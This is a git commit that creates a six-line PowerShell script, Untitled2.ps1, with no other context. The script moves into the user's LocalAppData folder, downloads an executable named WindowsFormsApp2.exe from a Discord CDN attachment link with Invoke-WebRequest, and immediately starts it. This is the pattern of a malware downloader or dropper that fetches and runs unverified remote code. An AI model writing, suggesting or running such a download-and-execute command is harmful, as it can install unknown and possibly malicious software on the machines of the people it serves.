ac0eeed9954691dc0618ff7a07f8fb4575fb548d
BlackJeck549649874 <152016835+BlackJeck549649874@users.noreply.github.com>
2023-12-08 21:25:17 +0300

    Create Untitled2.ps1

---
+++ Untitled2.ps1
@@ -0,0 +1,6 @@
+﻿cd $env:LOCALAPPDATA
+
+Invoke-WebRequest -URI https://cdn.discordapp.com/attachments/1178777779781771346/1182749184999301180/WindowsFormsApp2.exe -OutFile WindowsFormsApp2.exe
+
+cd $env:LOCALAPPDATA
+start "$env:LOCALAPPDATA\WindowsFormsApp2.exe"
